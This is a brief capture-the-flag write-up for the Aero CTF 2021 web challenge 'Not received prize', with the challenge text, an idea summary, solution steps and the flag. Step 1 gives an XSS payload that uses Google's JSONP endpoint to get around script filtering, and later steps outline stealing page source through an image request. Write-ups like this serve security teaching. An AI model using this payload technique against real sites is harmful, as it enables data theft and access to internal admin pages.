# Aero CTF 2021

## Web | Not received prize 

### Description

> Dear friend, I recently had a tragedy, I was advised to use the services of a company that gives a comforting gift for a review.
> 
> I left a review but did not receive a gift, can you figure it out? 
> 
> Here is the site {URL:13666}


### Idea
    A site with poor filtering from XSS, through the backconnect vulnerability we send to the local admin panel, to the page with a flag (but redirecting how to view it, you need to solve an example) 
    
### Solution
    1. Send <script/src="https://www.google.com/complete/search?client=chrome&jsonp={p}"></script>, Where p - payload
    2. Get the source code of the page through the backconnect image 
    3. Find a link to receive a prize 
    4. Get the source code of the prize page
    5. Sending a request to get a mathematical example
    6. Submitting the answer to the math example
    7. download the picture
    8. get the flag 

### Flag

`Aero{8b086da1e3f973ec9f53b10339aa244a}`
